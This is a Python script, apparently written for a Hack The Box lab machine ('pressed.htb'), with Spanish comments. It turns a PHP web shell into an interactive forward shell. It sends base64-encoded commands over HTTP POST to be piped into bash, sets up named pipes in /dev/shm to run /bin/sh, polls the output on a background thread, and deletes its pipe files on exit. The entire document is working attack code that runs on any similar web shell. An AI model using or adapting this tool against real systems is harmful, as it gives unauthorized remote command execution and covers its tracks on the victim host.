#!/usr/bin/env python3

import requests
import threading
import signal
import pdb
import time
import sys
from random import randrange
from base64 import b64encode

def def_handler(sig, def_handler):
  print("\n\n[!] Saliendo...\n")
  runCmd(eraseStdin)
  runCmd(eraseStdout)
  sys.exit(1)

# ctrl+c
signal.signal(signal.SIGINT, def_handler)

# Varibles globales
mainUrl = "http://pressed.htb/cmd.php"
session = randrange(1000, 9999)
stdin = f"/dev/shm/{session}.input"
stdout = f"/dev/shm/{session}.output"
eraseStdin = f"/bin/rm {stdin}"
eraseStdout = f"/bin/rm {stdout}"

class AllTheReads(object):
  def __init__(self, interval=1):
    self.interval = interval
    thread = threading.Thread(target=self.run, args=())
    thread.daemon = True
    thread.start()

  def run(self):
    clearOutput = f"echo '' > {stdout}"
    readOutput = f"/bin/cat {stdout}"

    while True:
      output = runCmd(readOutput)

      if output:
        runCmd(clearOutput)
        print(output)

      time.sleep(self.interval)
    
  

def runCmd(cmd):
  cmd = cmd.encode()
  cmd = b64encode(cmd).decode()
  
  post_data = {
    'cmd': f'echo {cmd} | base64 -d | bash'
  }

  response = (requests.post(mainUrl, data=post_data, timeout=5).text).strip()
  # response = requests.post(mainUrl, data=post_data, timeout=5)
  return response

def SetupShell():
  namedPipes = f"""mkfifo {stdin}; tail -f {stdin} | /bin/sh 2>&1 > {stdout}"""

  try:
    runCmd(namedPipes)
  except:
    None

  return None

def writeCmd(cmd):
  cmd = cmd.encode()
  cmd = b64encode(cmd).decode()
  
  post_data = {
    'cmd': f'echo {cmd} | base64 -d > {stdin}'
  }

  requests.post(mainUrl, data=post_data, timeout=5)

def readCmd():
  readOutput = f"/bin/cat {stdout}"

  output = runCmd(readOutput)

  return output

if __name__ == '__main__':
  SetupShell()
  readAlltheThings = AllTheReads()

  while True:
    cmd = input("> ")
    writeCmd(cmd + "\n")
    time.sleep(1.1)
    # output = readCmd()

    # print(output)

    # clearOutput = f"echo '' > {stdout}"
    # runCmd(clearOutput)
